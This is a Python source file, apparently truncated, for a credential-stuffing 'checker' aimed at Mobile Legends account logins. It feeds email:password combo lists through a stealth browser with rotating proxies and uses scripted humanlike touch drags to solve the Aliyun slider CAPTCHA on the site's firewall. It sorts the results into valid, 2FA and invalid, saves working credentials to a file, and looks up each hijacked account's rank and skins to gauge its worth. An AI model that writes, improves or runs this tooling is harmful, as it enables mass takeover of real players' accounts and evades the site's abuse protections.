import argparse
import asyncio
import concurrent.futures
import hashlib
import json
import math
import os
import random
import sys
import threading
import time
import urllib.parse

for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="backslashreplace")
    except Exception:
        pass

try:
    from cloakbrowser import launch_async
except ImportError:
    print("[!] cloakbrowser not installed: pip install cloakbrowser")
    sys.exit(1)

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

INFO_OK = False
get_player_info = None
DeviceManager = None
lookup_player_data = None

try:
    from info import get_player_info as _gpi, DeviceManager as _DM
    get_player_info = _gpi
    DeviceManager = _DM
    INFO_OK = True
except Exception:
    pass

try:
    from lookup import lookup_player_data as _lpd
    lookup_player_data = _lpd
    INFO_OK = True
except Exception:
    pass


# Kulay (pinanatili ang hitsura ng Ezekiel.py)
class C:
    G = '\033[92m'
    R = '\033[91m'
    Y = '\033[93m'
    C = '\033[96m'
    M = '\033[95m'
    W = '\033[97m'
    RST = '\033[0m'


API_URL = os.getenv("MLBB_LOGIN_API", "https://accountmtapi.mobilelegends.com/")
LOGIN_PAGE = "https://mtacc.mobilelegends.com/v3.0/inapp/loginbyemail"
FETCH_HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "X-Requested-With": "com.mobile.legends",
    "Referer": LOGIN_PAGE,
    "Origin": "https://mtacc.mobilelegends.com",
}

DEVICES_FILE = os.path.join(_HERE, "devices.txt")
PROXY_FILE = os.path.join(_HERE, "proxies.txt")
DEFAULT_WORKERS = 10
MAX_WORKERS = 25
WORKER_DELAY = 0.25
MAX_RETRIES = 2
RETRY_PAUSE = 0.2
DO_LOGIN_TIMEOUT = 45.0
INFO_FETCH_TIMEOUT = 15.0
PROXY_FAIL_ROTATE_THRESHOLD = 2
PROXY_RELOAD_INTERVAL = 30.0
BATCH_RESET_ACCOUNTS = 25
PROXY_TEST_TIMEOUT = 15

_2FA_CODES = {1086, 1087, 1088, 1089, 1090}
RANKS = ["Warrior", "Elite", "Master", "GM", "Epic", "Legend", "Honor", "Mythic", "Glory", "Immortal"]
COLLECTORS = ["None", "Amateur", "Junior", "Seasoned", "Expert", "Renowned", "Exalted", "Mega", "World"]

_UI_LOCK = threading.Lock()
_FILE_LOCK = threading.Lock()
_BROWSER_LOCK = asyncio.Lock()
_INFO_EXECUTOR = concurrent.futures.ThreadPoolExecutor(max_workers=20)


def _md5(t: str) -> str:
    return hashlib.md5(t.encode("utf-8")).hexdigest().lower()


def _sign_op(op: str, params: dict) -> str:
    p = dict(params)
    p["country"] = ""
    parts = "".join(
        f"{k}={p[k]}&"
        for k in sorted(p)
        if p[k] is not None and k not in ("only_check", "sms_type")
    )
    return _md5(parts + f"op={op}")


def _make_payload(email: str, password: str) -> str:
    p = {"account": email, "md5pwd": _md5(password)}
    return json.dumps(
        {
            "op": "new_login_pwd",
            "sign": _sign_op("new_login_pwd", p),
            "params": dict(p, country=""),
            "lang": "en",
        },
        separators=(",", ":"),
    )


def _dummy_payload() -> str:
    return _make_payload("waf_probe@example.com", "000000")


def _is_2fa_response(code, msg: str, data: dict, raw_dict: dict) -> bool:
    try:
        code_int = int(code) if code is not None else None
    except (TypeError, ValueError):
        code_int = None

    if code_int in _2FA_CODES:
        return True

    low = (msg or "").lower()
    compact = low.replace(" ", "").replace("_", "")
    if (
        "needemailcode" in compact
        or ("email" in low and ("code" in low or "verif" in low))
        or data.get("need_email_code") is True
        or raw_dict.get("need_email_code") is True
    ):
        return True
    return False


def classify(text: str):
    if not text:
        return ("retry", {"message": "empty_response"})
    stripped = text.strip()
    if not stripped.startswith("{"):
        low = stripped.lower()
        if "aliyuncaptcha" in low or "slider" in low or "verify" in low:
            return ("retry", {"message": "waf_html_slider"})
        return ("retry", {"message": f"waf_html_{len(stripped)}b"})
    try:
        d = json.loads(stripped)
    except Exception:
        return ("retry", {"message": "json_parse_fail"})
    if not isinstance(d, dict):
        return ("retry", {"message": "json_not_dict"})

    code = d.get("code", -999)
    msg = str(d.get("message") or d.get("msg") or "").strip()
    low_msg = msg.lower()
    data = d.get("data") if isinstance(d.get("data"), dict) else {}

    if code == 0 or str(code) == "0":
        guid = str(data.get("guid") or d.get("guid") or "").strip()
        sess = str(data.get("session") or d.get("session") or "").strip()
        if guid or sess:
            out = dict(data)
            out.setdefault("guid", guid)
            out.setdefault("session", sess)
            role_id = (
                d.get("app_role_id")
                or data.get("app_role_id")
                or ((data.get("role") or {}).get("app_role_id") if isinstance(data.get("role"), dict) else None)
            )
            if role_id and not out.get("app_role_id"):
                out["app_role_id"] = str(role_id)
            return ("valid", out)
        if _is_2fa_response(code, msg, data, d):
            out = dict(d)
            if guid and not out.get("guid"):
                out["guid"] = guid
            return ("2fa", out)
        return ("error", {"message": msg or "code_0_missing_session"})

    if _is_2fa_response(code, msg, data, d):
        out = dict(d)
        guid = str(data.get("guid") or d.get("guid") or "").strip()
        if guid and not out.get("guid"):
            out["guid"] = guid
        return ("2fa", out)

    try:
        code_num = int(code)
    except (TypeError, ValueError):
        code_num = -999

    if code_num in (1005, 3301, 3302):
        return ("invalid", d)
    if code_num in (1013, -2, -1) or "captcha" in low_msg or "waf" in low_msg or "freq" in low_msg:
        return ("retry", d)
    return ("error", {"message": f"{msg or 'unknown'} (code={code})"})


def parse_proxy(raw: str):
    try:
        raw = (raw or "").strip()
        if not raw or raw.startswith("#"):
            return None
        if "\t" in raw:
            raw = raw.replace("\t", ":")

        if "://" in raw:
            u = urllib.parse.urlparse(raw)
            scheme = (u.scheme or "").lower()
            if scheme not in ("http", "https", "socks5", "socks5h"):
                return None
            host = u.hostname
            port = u.port
            if not host or not port or not (1 <= port <= 65535):
                return None
            proxy = {"server": f"{scheme}://{host}:{port}"}
            if u.username is not None:
                proxy["username"] = urllib.parse.unquote(u.username)
            if u.password is not None:
                proxy["password"] = urllib.parse.unquote(u.password)
            return proxy

        if "@" in raw:
            creds, hostpart = raw.rsplit("@", 1)
            user, pwd = (creds.split(":", 1) + [""])[:2]
            hp = hostpart.split(":")
            if len(hp) != 2:
                return None
            host, portstr = hp
            port = int(portstr)
            if not host or not (1 <= port <= 65535):
                return None
            proxy = {"server": f"http://{host}:{port}"}
            if user:
                proxy["username"] = user
            if pwd:
                proxy["password"] = pwd
            return proxy

        parts = raw.split(":")
        if len(parts) == 2:
            host, portstr = parts
            port = int(portstr)
            if not host or not (1 <= port <= 65535):
                return None
            return {"server": f"http://{host}:{port}"}

        if len(parts) == 3:
            host, portstr, user = parts
            port = int(portstr)
            if not host or not (1 <= port <= 65535):
                return None
            return {"server": f"http://{host}:{port}", "username": user}

        if len(parts) == 4:
            try:
                port_a = int(parts[1])
                if parts[0] and 1 <= port_a <= 65535:
                    return {
                        "server": f"http://{parts[0]}:{port_a}",
                        "username": parts[2],
                        "password": parts[3],
                    }
            except ValueError:
                pass
            port_b = int(parts[3])
            if not parts[2] or not (1 <= port_b <= 65535):
                return None
            return {
                "server": f"http://{parts[2]}:{port_b}",
                "username": parts[0],
                "password": parts[1],
            }

        return None
    except Exception:
        return None


def safe_proxy_str(proxy: dict) -> str:
    if not proxy:
        return "<none>"
    server = proxy.get("server", "")
    user = proxy.get("username", "")
    if user:
        if "://" in server:
            scheme, rest = server.split("://", 1)
            return f"{scheme}://{user}:***@{rest}"
        return f"{user}:***@{server}"
    return server


def load_proxies(path: str):
    if not path or not os.path.exists(path):
        return []
    lines = []
    seen = set()
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for ln in f:
                ln = ln.lstrip("\ufeff").strip()
                if ln and not ln.startswith("#") and ln not in seen:
                    seen.add(ln)
                    lines.append(ln)
    except Exception:
        pass
    return lines


class ProxyRotator:
    def __init__(self, proxies: list, proxy_file: str = None):
        self._lock = threading.Lock()
        self._proxy_file = proxy_file
        self._last_reload = time.time()
        self._proxies = list(proxies or [])
        self._idx = 0
        self._bad = set()

    def _reload_from_disk_locked(self, force: bool = False):
        if not self._proxy_file or not os.path.exists(self._proxy_file):
            return
        now = time.time()
        if not force and (now - self._last_reload < PROXY_RELOAD_INTERVAL):
            return
        self._last_reload = now
        fresh = []
        seen_keys = set()
        try:
            with open(self._proxy_file, "r", encoding="utf-8", errors="ignore") as f:
                for ln in f:
                    ln = ln.lstrip("\ufeff").strip()
                    if not ln or ln.startswith("#"):
                        continue
                    parsed = parse_proxy(ln)
                    if parsed:
                        key = safe_proxy_str(parsed)
                        if key not in seen_keys:
                            seen_keys.add(key)
                            fresh.append(parsed)
            if fresh:
                self._proxies = fresh
                self._bad = {k for k in self._bad if k in seen_keys}
        except Exception:
            pass

    def next_proxy(self, current=None):
        with self._lock:
            self._reload_from_disk_locked(force=False)
            if not self._proxies:
                return None
            alive = [p for p in self._proxies if safe_proxy_str(p) not in self._bad]
            if not alive:
                self._bad.clear()
                self._reload_from_disk_locked(force=True)
                alive = list(self._proxies)
            if len(alive) > 1 and current is not None:
                cur_key = safe_proxy_str(current)
                candidates = [p for p in alive if safe_proxy_str(p) != cur_key]
                if candidates:
                    alive = candidates
            chosen = alive[self._idx % len(alive)]
            self._idx += 1
            return chosen

    def mark_bad(self, proxy):
        if not proxy:
            return
        with self._lock:
            key = safe_proxy_str(proxy)
            if len(self._proxies) > 1:
                self._bad.add(key)


async def test_proxy(proxy: dict, browser) -> bool:
    ctx = None
    try:
        ctx = await browser.new_context(proxy=proxy, ignore_https_errors=True)
        page = await ctx.new_page()
        page.set_default_timeout(PROXY_TEST_TIMEOUT * 1000)
        resp = await page.goto(
            LOGIN_PAGE,
            wait_until="domcontentloaded",
            timeout=PROXY_TEST_TIMEOUT * 1000,
        )
        if resp is None or resp.status >= 502:
            return False
        return True
    except Exception:
        return False
    finally:
        if ctx:
            try:
                await ctx.close()
            except Exception:
                pass


async def filter_working_proxies(raw_proxies, browser, concurrency=10):
    good = []
    sem = asyncio.Semaphore(max(1, concurrency))
    lock = asyncio.Lock()

    async def one(raw):
        async with sem:
            p = parse_proxy(raw)
            if p is not None and await test_proxy(p, browser):
                async with lock:
                    good.append(p)

    await asyncio.gather(*(asyncio.create_task(one(r)) for r in raw_proxies), return_exceptions=True)
    return good


def _short_rank(rank_str):
    s = (rank_str or "").strip()
    if not s:
        return "Warrior"
    if s.startswith("Mythical Immortal"):
        return "Immortal"
    if s.startswith("Mythical Glory"):
        return "Glory"
    if s.startswith("Mythical Honor"):
        return "Honor"
    if s.startswith("Grandmaster"):
        return "GM"
    for r in RANKS:
        if s.startswith(r):
            return r
    return "Warrior"


def _short_collector(col_str):
    s = (col_str or "").strip()
    if not s or s == "No Tier":
        return "None"
    for col in COLLECTORS:
        if s == col or s.startswith(col):
            return col
    return "None"


def _has_val(v):
    return v not in (None, "", "N/A", "Unknown")


def _extract_summary(info, fallback_nick=""):
    """
    Nagbabalik ng:
      - rank_label: maikling rank para sa dashboard (e.g., Elite)
      - col_label: maikling collector tier para sa dashboard (e.g., None)
      - level_str: e.g., Lv14
      - nick_str: e.g., Mark11
      - detail_str: format na "Mark11 Lv14 Skins:4 Rank:Elite II"
    """
    rank_label = "Warrior"
    col_label = "None"
    level_str = ""
    nick_str = (fallback_nick or "").strip()
    skins_val = "0"
    full_rank = "Unknown"

    if isinstance(info, dict) and info.get("status") == "success":
        pd = info.get("player_data") if isinstance(info.get("player_data"), dict) else {}
        d = info.get("data") if isinstance(info.get("data"), dict) else {}
        bi = d.get("basic_info") or {}
        gi = d.get("game_info") or {}
        ci = d.get("collector_info") or {}
        si = d.get("skin_info") or {}
        sb = si.get("skin_breakdown") or pd.get("skin_breakdown") or {}

        raw_rank = (
            pd.get("current_rank")
            or gi.get("current_rank")
            or pd.get("high_rank")
            or gi.get("high_rank")
            or ""
        )
        raw_col = pd.get("collector_tier") or ci.get("collector_tier") or ""
        nick_cand = str(pd.get("nickname") or bi.get("nickname") or "").strip()
        if _has_val(nick_cand):
            nick_str = nick_cand

        lv = pd.get("level") or bi.get("level")
        if _has_val(lv):
            level_str = f"Lv{lv}"

        skin_cand = (
            sb.get("Total Skins")
            if _has_val(sb.get("Total Skins"))
            else sb.get("total")
            if _has_val(sb.get("total"))
            else bi.get("skin_count")
            if _has_val(bi.get("skin_count"))
            else pd.get("skin")
        )
        if _has_val(skin_cand):
            skins_val = str(skin_cand)

        if _has_val(raw_rank):
            full_rank = str(raw_rank).strip()

        rank_label = _short_rank(raw_rank)
        col_label = _short_collector(raw_col)

    disp_nick = nick_str or "Unknown"
    disp_lv = level_str or "Lv?"
    detail_str = f"{disp_nick} {disp_lv} Skins:{skins_val} Rank:{full_rank}"
    return rank_label, col_label, level_str, nick_str, detail_str


def _append_line(filename, line):
    with _FILE_LOCK:
        try:
            with open(os.path.join(_HERE, filename), "a", encoding="utf-8", errors="replace") as f:
                f.write(line + "\n")
                f.flush()
        except Exception:
            pass


def fetch_info_sync(guid, sess, dm, role_id=""):
    guid_s = str(guid or "").strip()
    sess_s = str(sess or "").strip()
    role_s = str(role_id or "").strip()

    if guid_s and sess_s and dm and get_player_info:
        try:
            g_int = int(guid_s)
            if g_int > 0:
                res = get_player_info(g_int, sess_s, dm, max_device_retries=4)
                if isinstance(res, dict) and res.get("status") == "success":
                    return res
        except Exception:
            pass

    target = role_s or guid_s
    if target and lookup_player_data:
        try:
            res = lookup_player_data(target)
            if isinstance(res, dict) and res.get("status") == "success":
                return res
        except Exception:
            pass

    return None


async def fetch_info_async(guid, sess, dm, role_id=""):
    if not INFO_OK:
        return None
    loop = asyncio.get_running_loop()
    try:
        return await asyncio.wait_for(
            loop.run_in_executor(_INFO_EXECUTOR, fetch_info_sync, guid, sess, dm, role_id),
            timeout=INFO_FETCH_TIMEOUT,
        )
    except Exception:
        return None


async def _touch(cdp, etype, x, y, keep=False):
    pts = [] if keep else [{"x": float(x), "y": float(y), "radiusX": 6, "radiusY": 6, "force": 1, "id": 1}]
    try:
        await cdp.send("Input.dispatchTouchEvent", {"type": etype, "touchPoints": pts})
    except Exception:
        pass


async def _human_drag(page, ctx, sx, sy, dist):
    cdp = None
    try:
        cdp = await ctx.new_cdp_session(page)
        R = lambda a, b: a + random.random() * (b - a)
        pts = []
        x = 0.0
        ae = dist * R(0.28, 0.40)
        for i in range(2 + int(random.random() * 2)):
            x += R(3, 7) * (1 + i * 0.6)
            if x > ae:
                x = ae
                break
            pts.append({"x": x, "d": R(12, 25)})
        nf = 4 + int(random.random() * 4)
        rem = dist - x
        for i in range(nf):
            step = rem / (nf - i) * R(0.8, 1.2)
            if step < 4 or x + step >= dist - 1:
                break
            x += step
            pts.append({"x": x, "d": R(4, 9)})
        pts.append({"x": dist + R(1.5, 4), "d": R(12, 22)})
        pts.append({"x": dist + R(-1, 1), "d": R(10, 18)})
        pts.append({"x": dist, "d": R(5, 10)})
        pts.append({"x": dist, "d": R(5, 10)})
        await _touch(cdp, "touchStart", sx, sy)
        await asyncio.sleep(R(15, 30) / 1000)
        for p in pts:
            prog = min(p["x"] / dist, 1.0) if dist > 0 else 0
            wb = 2.6 * math.sin(math.pi * prog)
            dy = wb * 0.3 if p["x"] >= dist else wb * R(0.55, 1.0)
            await _touch(cdp, "touchMove", sx + p["x"], sy + dy + R(-0.4, 0.4))
            await asyncio.sleep(p["d"] / 1000)
        await _touch(cdp, "touchEnd", sx + dist, sy, keep=True)
        return True
    except Exception:
        return False
    finally:
        if cdp is not None:
            try:
                await cdp.detach()
            except Exception:
                pass


async def solve_waf(page, ctx):
    if page.is_closed():
        return False
    try:
        has = await page.evaluate("()=>!!document.getElementById('aliyunCaptcha-sliding-slider')")
    except Exception:
        return False
    if not has:
        return True

    await asyncio.sleep(0.25)
    box = await page.evaluate(
        """()=>{
        const s=document.getElementById('aliyunCaptcha-sliding-slider');
        if(!s) return null;
        const r=s.getBoundingClientRect();
        const w=s.closest('#aliyunCaptcha-sliding-wrapper')||s.parentElement;
        const pr=w?w.getBoundingClientRect():r;
        return {x:r.x,y:r.y,w:r.width,h:r.height,mt:pr.width-r.width};
    }"""
    )
    if not box or box.get("w", 0) <= 5:
        return False

    verify_ok = {"value": False}

    async def on_response(response):
        url = response.url or ""
        if any(k in url for k in ("verify", "slideVerify", "captcha", "_____tmd_____")):
            try:
                text = await response.text()
                if (
                    '"VerifyResult":true' in text
                    or '"success":true' in text
                    or '"Success":true' in text
                ):
                    verify_ok["value"] = True
            except Exception:
                pass

    page.on("response", on_response)
    try:
        sx = box["x"] + box["w"] / 2
        sy = box["y"] + box["h"] / 2
        mt = box.get("mt")
        dist = float(mt) if (mt and mt > 20) else 280.0
        dist = min(295.0, max(40.0, dist))
        await _human_drag(page, ctx, sx, sy, dist)
        await asyncio.sleep(1.6)
    finally:
        try:
            page.remove_listener("response", on_response)
        except Exception:
            pass

    if verify_ok["value"]:
        return True

    try:
        still = await page.evaluate("()=>!!document.getElementById('aliyunCaptcha-sliding-slider')")
        if not still:
            has_acw = any("acw" in ck["name"].lower() for ck in await ctx.cookies())
            if has_acw:
                return True
    except Exception:
        pass
    return False


async def _safe_close(obj):
    if obj is None:
        return
    try:
        await obj.close()
    except Exception:
        pass


async def _launch_browser_locked(headless=True):
    async with _BROWSER_LOCK:
        for attempt in range(3):
            try:
                b = await launch_async(headless=headless, humanize=True)
                if b is not None:
                    return b
            except Exception:
                await asyncio.sleep(0.6 * (attempt + 1))
    raise RuntimeError("Failed to launch cloakbrowser")


async def warm_context(page, ctx):
    if page.is_closed():
        return False
    try:
        await page.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=25000)
    except Exception:
        return False

    await asyncio.sleep(random.uniform(0.5, 0.9))
    try:
        await page.evaluate(
            f"()=>{{fetch('{API_URL}',{{method:'POST',credentials:'include',"
            f"headers:{json.dumps(FETCH_HEADERS)},body:{json.dumps(_dummy_payload())}}}).catch(()=>{{}})}}"
        )
    except Exception:
        pass

    try:
        await page.wait_for_selector("#aliyunCaptcha-sliding-slider", timeout=3500)
    except Exception:
        pass
    return True


async def reset_session(page, ctx):
    try:
        await ctx.clear_cookies()
    except Exception:
        pass
    try:
        if not page.is_closed():
            await page.evaluate(
                "()=>{try{delete window.__loginPromise;delete window.__loginAbort;"
                "localStorage.clear();sessionStorage.clear()}catch(e){}}"
            )
    except Exception:
        pass
    return await warm_context(page, ctx)


async def _build_context_and_page(browser, proxy=None):
    ctx_kwargs = {"has_touch": True, "ignore_https_errors": True}
    if proxy:
        ctx_kwargs["proxy"] = proxy
    ctx = await browser.new_context(**ctx_kwargs)
    page = await ctx.new_page()
    page.set_default_timeout(15000)
    warmed = await warm_context(page, ctx)
    if not warmed:
        await asyncio.sleep(0.8)
        warmed = await warm_context(page, ctx)
    return ctx, page, warmed


async def do_login(page, ctx, email, password):
    if page.is_closed():
        return ("retry", {"message": "page_closed"})

    body = _make_payload(email, password)
    headers_js = json.dumps(FETCH_HEADERS)
    timeout_ms = int(DO_LOGIN_TIMEOUT * 1000)

    promise_js = (
        f"(()=>{{try{{if(window.__loginAbort)window.__loginAbort.abort()}}catch(e){{}};"
        f"const ctl=new AbortController();window.__loginAbort=ctl;"
        f"const tm=setTimeout(()=>{{try{{ctl.abort()}}catch(e){{}}}},{timeout_ms});"
        f"window.__loginPromise=fetch('{API_URL}',{{method:'POST',credentials:'include',"
        f"headers:{headers_js},body:{json.dumps(body)},signal:ctl.signal}})"
        f".then(r=>r.text())"
        f".catch(e=>'FETCH_ERR:'+((e&&e.name==='AbortError')?'timeout_abort':(e&&e.message||e)))"
        f".finally(()=>clearTimeout(tm))}})()"
    )

    try:
        await page.evaluate(promise_js)
    except Exception as e:
        msg = str(e).lower()
        if "closed" in msg or "target" in msg or "destroyed" in msg:
            return ("retry", {"message": "page_closed"})
        return ("retry", {"message": "eval_inject_err"})

    txt = ""
    drag_attempt = 0

    try:
        for _ in range(36):
            if page.is_closed():
                return ("retry", {"message": "page_closed"})
            try:
                has_slider = await page.evaluate(
                    "()=>!!document.getElementById('aliyunCaptcha-sliding-slider')"
                )
                if has_slider:
                    drag_attempt += 1
                    if drag_attempt <= 3:
                        await solve_waf(page, ctx)
                        await asyncio.sleep(0.8)
                        continue
                    else:
                        await reset_session(page, ctx)
                        try:
                            await page.evaluate(promise_js)
                        except Exception:
                            pass
                        drag_attempt = 0
                        continue
            except Exception as e:
                msg = str(e).lower()
                if "closed" in msg or "target" in msg or "destroyed" in msg:
                    return ("retry", {"message": "page_closed"})

            try:
                res = await page.evaluate(
                    """async()=>{
                    if(!window.__loginPromise) return '__PENDING__';
                    const timeout = new Promise(r=>setTimeout(()=>r('__PENDING__'),120));
                    return await Promise.race([window.__loginPromise, timeout]);
                }"""
                )
                if res and res != "__PENDING__":
                    txt = res
                    break
            except Exception as e:
                msg = str(e).lower()
                if "closed" in msg or "target" in msg or "destroyed" in msg:
                    return ("retry", {"message": "page_closed"})

            await asyncio.sleep(0.5)
    finally:
        try:
            if not page.is_closed():
                await page.evaluate(
                    "()=>{try{if(window.__loginAbort)window.__loginAbort.abort()}catch(e){};"
                    "try{delete window.__loginPromise;delete window.__loginAbort}catch(e){}}"
                )
        except Exception:
            pass

    if not txt:
        return ("retry", {"message": "timeout_poll"})
    if txt.startswith("FETCH_ERR"):
        return ("retry", {"message": txt[:60]})
    return classify(txt)


def get_dashboard_text(processed, total, stats, start_time, top_hits, num_workers):
    elapsed = time.time() - start_time
    speed = processed / elapsed if elapsed > 0 else 0
    eta = ((total - processed) / speed) if speed > 0 else 0
    progress_pct = (processed / total) * 100 if total > 0 else 0

    dash = f"{C.C}┌─────────────────── DASHBOARD ───────────────────┐{C.RST}\n"
    dash += f"│ {C.M}Progress:{C.RST} {processed}/{total} ({progress_pct:.1f}%) | {C.G}Workers: {num_workers}{C.RST}\n"
    dash += f"│ {C.G}OK {stats['VALID']}{C.RST} | {C.M}2FA {stats['2FA']}{C.RST} | {C.R}BAD {stats['INVALID']}{C.RST} | {C.Y}ERR {stats['ERROR']}{C.RST} | {C.C}Speed: {speed:.1f}/s{C.RST} | ETA: {int(eta)}s\n"
    dash += f"{C.C}├─────────────────────────────────────────────────┤{C.RST}\n"
    dash += f"│ {C.Y}COLLECTOR{C.RST}\n"
    dash += f"│ World {top_hits.get('World', 0):<2} | Mega {top_hits.get('Mega', 0):<2} | Exalted {top_hits.get('Exalted', 0):<2} | Renowned {top_hits.get('Renowned', 0):<2}\n"
    dash += f"│ Expert {top_hits.get('Expert', 0):<2} | Seasoned {top_hits.get('Seasoned', 0):<2} | Junior {top_hits.get('Junior', 0):<2} | Amateur {top_hits.get('Amateur', 0):<2}\n"
    dash += f"│ None {top_hits.get('None', 0):<2}\n"
    dash += f"{C.C}├─────────────────────────────────────────────────┤{C.RST}\n"
    dash += f"│ {C.M}RANK{C.RST}\n"
    dash += f"│ Immortal {top_hits.get('Immortal', 0):<2} | Glory {top_hits.get('Glory', 0):<2} | Honor {top_hits.get('Honor', 0):<2} | Mythic {top_hits.get('Mythic', 0):<2}\n"
    dash += f"│ Legend {top_hits.get('Legend', 0):<2} | Epic {top_hits.get('Epic', 0):<2} | GM {top_hits.get('GM', 0):<2} | Master {top_hits.get('Master', 0):<2}\n"
    dash += f"│ Elite {top_hits.get('Elite', 0):<2} | Warrior {top_hits.get('Warrior', 0):<2}\n"
    dash += f"{C.C}├─────────────────────────────────────────────────┤{C.RST}\n"
    dash += f"│ {C.C}TOP LEVEL{C.RST}\n"
    if not top_hits.get('LIST'):
        dash += f"│ no hits yet\n"
    else:
        for hit in top_hits['LIST'][-3:]:
            dash += f"│ {hit}\n"
    dash += f"{C.C}└─────────────────────────────────────────────────┘{C.RST}\n"
    return dash


async def _run_checker(combos, dm, rotator, use_proxy, desired_workers=DEFAULT_WORKERS):
    stats = {"VALID": 0, "INVALID": 0, "ERROR": 0, "2FA": 0}
    top_hits = {r: 0 for r in RANKS}
    top_hits.update({col: 0 for col in COLLECTORS})
    top_hits["LIST"] = []
    valid_list = []
    invalid_list = []
    recent_logs = []

    start_time = time.time()
    processed = 0
    total = len(combos)

    # Gamitin ang gustong bilang ng workers (hal. 10)
    num_workers = max(1, min(int(desired_workers or DEFAULT_WORKERS), total))
    combo_q: asyncio.Queue = asyncio.Queue()
    for c_item in combos:
        combo_q.put_nowait(c_item)
    for _ in range(num_workers):
        combo_q.put_nowait(None)

    browser = await _launch_browser_locked(headless=True)
    if use_proxy and rotator and not rotator._proxies:
        raw_p = load_proxies(PROXY_FILE)
        if raw_p:
            good_p = await filter_working_proxies(raw_p, browser, concurrency=num_workers)
            rotator._proxies = good_p if good_p else [p for r in raw_p if (p := parse_proxy(r))]

    state_lock = asyncio.Lock()

    async def render_ui():
        with _UI_LOCK:
            os.system("cls" if os.name == "nt" else "clear")
            print(get_dashboard_text(processed, total, stats, start_time, top_hits, num_workers))
            print(f"{C.C}--- RECENT LOGS ---{C.RST}")
            for log in recent_logs:
                print(log)

    async def worker_loop(wid):
        nonlocal processed
        ctx = None
        page = None
        batch_count = 0
        proxy_fails = 0
        current_proxy = rotator.next_proxy() if (use_proxy and rotator) else None

        try:
            ctx, page, _ = await _build_context_and_page(browser, proxy=current_proxy)
            while True:
                item = await combo_q.get()
                if item is None:
                    combo_q.task_done()
                    break

                user, pwd = item
                if WORKER_DELAY > 0:
                    await asyncio.sleep(WORKER_DELAY)

                status = "error"
                data = {}
                try:
                    if BATCH_RESET_ACCOUNTS > 0 and batch_count >= BATCH_RESET_ACCOUNTS:
                        if use_proxy and rotator:
                            current_proxy = rotator.next_proxy(current_proxy)
                        await _safe_close(page)
                        await _safe_close(ctx)
                        ctx, page, _ = await _build_context_and_page(browser, proxy=current_proxy)
                        batch_count = 0

                    for rtry in range(1, MAX_RETRIES + 1):
                        try:
                            status, data = await asyncio.wait_for(
                                do_login(page, ctx, user, pwd),
                                timeout=DO_LOGIN_TIMEOUT,
                            )
                        except asyncio.TimeoutError:
                            status, data = "retry", {"message": "do_login_hard_timeout"}

                        if status in ("valid", "2fa", "invalid"):
                            proxy_fails = 0
                            break

                        msg = str((data or {}).get("message", ""))
                        is_net = any(
                            k in msg.lower()
                            for k in ("page_closed", "timeout", "waf_html", "fetch_err")
                        )
                        if is_net and use_proxy and rotator:
                            proxy_fails += 1
                            if proxy_fails >= PROXY_FAIL_ROTATE_THRESHOLD:
                                rotator.mark_bad(current_proxy)
                                current_proxy = rotator.next_proxy(current_proxy)
                                proxy_fails = 0
                                await _safe_close(page)
                                await _safe_close(ctx)
                                ctx, page, _ = await _build_context_and_page(browser, proxy=current_proxy)
                                batch_count = 0
                                continue

                        if "page_closed" in msg or "hard_timeout" in msg:
                            await _safe_close(page)
                            await _safe_close(ctx)
                            ctx, page, _ = await _build_context_and_page(browser, proxy=current_proxy)
                            batch_count = 0
                        else:
                            await reset_session(page, ctx)

                        if rtry < MAX_RETRIES:
                            await asyncio.sleep(RETRY_PAUSE + random.uniform(0.05, 0.2))

                    if status == "retry":
                        status = "error"
                    batch_count += 1

                except Exception as exc:
                    status = "error"
                    data = {"message": str(exc)[:100]}

                rank_label = "Warrior"
                col_label = "None"
                hit_label = None
                detail_str = ""
                err_msg = ""

                if status == "valid":
                    guid = str((data or {}).get("guid") or "")
                    sess = str((data or {}).get("session") or "")
                    role_id = str((data or {}).get("app_role_id") or "")
                    fallback_nick = user.split("@", 1)[0][:12] if "@" in user else user[:12]
                    info = await fetch_info_async(guid, sess, dm, role_id=role_id)
                    rank_label, col_label, level_str, nick_str, detail_str = _extract_summary(
                        info, fallback_nick=fallback_nick
                    )
                    hit_label = detail_str
                    saved_line = f"{user}:{pwd} | GUID:{guid} | {detail_str}"
                    _append_line("valid_accounts.txt", saved_line)
                elif status == "2fa":
                    guid = str((data or {}).get("guid") or "")
                    msg = str((data or {}).get("message") or "Error_NeedEmailCode_login")
                    err_msg = f"{msg} (GUID:{guid})" if guid else msg
                    _append_line("2fa_accounts.txt", f"{user}:{pwd} | {err_msg}")
                elif status == "invalid":
                    code = (data or {}).get("code")
                    msg = str((data or {}).get("message") or "Error_PasswdError")
                    err_msg = f"{msg} (code {code})" if code not in (None, 0) else msg
                else:
                    err_msg = str((data or {}).get("message") or "Login error")[:100]

                should_draw = False
                async with state_lock:
                    processed += 1
                    if status == "valid":
                        stats["VALID"] += 1
                        valid_list.append(saved_line)
                        r_key = rank_label if rank_label in top_hits else "Warrior"
                        c_key = col_label if col_label in top_hits else "None"
                        top_hits[r_key] += 1
                        top_hits[c_key] += 1
                        top_hits["LIST"].append(hit_label or f"{user[:10]}:{pwd[:10]} | {r_key}")
                        log_msg = f"{C.G}[VALID] {user}:{pwd} -> | {detail_str}{C.RST}"
                    elif status == "2fa":
                        stats["2FA"] += 1
                        log_msg = f"{C.M}[ 2FA ] {user}:{pwd} -> {err_msg}{C.RST}"
                    elif status == "invalid":
                        stats["INVALID"] += 1
                        invalid_list.append(f"{user}:{pwd}")
                        log_msg = f"{C.R}[INVALID] {user}:{pwd} -> {err_msg}{C.RST}"
                    else:
                        stats["ERROR"] += 1
                        log_msg = f"{C.Y}[ERROR] {user}:{pwd} -> {err_msg}{C.RST}"

                    recent_logs.append(log_msg)
                    if len(recent_logs) > 5:
                        recent_logs.pop(0)

                    if processed % 2 == 0 or processed == total:
                        should_draw = True

                if should_draw:
                    await render_ui()

                combo_q.task_done()
        finally:
            await _safe_close(page)
            await _safe_close(ctx)

    tasks = [asyncio.create_task(worker_loop(i)) for i in range(num_workers)]
    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    finally:
        await _safe_close(browser)
        try:
            _INFO_EXECUTOR.shutdown(wait=False, cancel_futures=True)
        except TypeError:
            _INFO_EXECUTOR.shutdown(wait=False)

    return valid_list, invalid_list


def _prompt_workers(default=DEFAULT_WORKERS):
    raw = input(
